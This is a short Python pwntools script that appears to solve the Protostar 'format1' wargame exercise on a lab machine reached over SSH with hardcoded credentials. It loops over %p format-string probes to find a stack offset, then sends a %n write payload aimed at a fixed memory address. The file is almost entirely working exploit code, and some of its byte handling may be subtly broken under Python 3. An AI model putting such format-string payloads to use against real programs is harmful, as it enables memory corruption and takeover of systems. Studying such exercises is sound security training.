from pwn import *

target_add='\x38\x96\x04\x08' 

r = ssh(host="192.168.160.128" , user="user", password="user")

postion_in_stck=0
for i in range(200):  
    payload = bytes('AABBBBAA%{}$8p'.format(i).encode())    
    format1 = r.run(["/opt/protostar/bin/format1" , payload]) 
    output= format1.recv().decode()
    
    print(output)
    if "42424242" in  output:  
        print("position in the stack : ", i , " : " ,output)
        postion_in_stck = i
        break
    
    format1.close()



finalPayload ='AA{}AA%{}$8n'.format(target_add,postion_in_stck )
print("[+] PAYLOAD : " , finalPayload)
format1 = r.run(["/opt/protostar/bin/format1" , finalPayload])
print(format1.recv())
format1.close()